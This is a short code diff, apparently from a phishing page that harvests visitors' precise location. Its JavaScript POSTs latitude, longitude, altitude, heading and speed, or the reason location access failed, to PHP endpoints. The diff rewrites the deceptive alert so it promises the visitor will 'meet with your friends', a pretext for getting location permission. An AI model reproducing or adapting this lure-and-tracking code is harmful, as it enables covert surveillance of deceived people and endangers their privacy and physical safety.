@@ -21,12 +21,12 @@ function locate()
 
     $.ajax({
       type: 'POST',
-      url: './php/result.php',
+      url: '/php/result.php',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
-      success: function(){$('#change').html('Coming Soon');},
+      success: function(){$('#change').html('Be Ready');},
       mimeType: 'text'
     });
-    alert('Thankyou For Taking Interest in Near You We will notify you...');
+    alert('Thankyou:-- Very Soon You Will Meet With Your Friends...');
   };
 }
 
@@ -52,7 +52,7 @@ function showError(error)
 
   $.ajax({
     type: 'POST',
-    url: './php/error.php',
+    url: '/php/error.php',
     data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
     success: function(){$('#change').html('Failed');},
     mimeType: 'text'
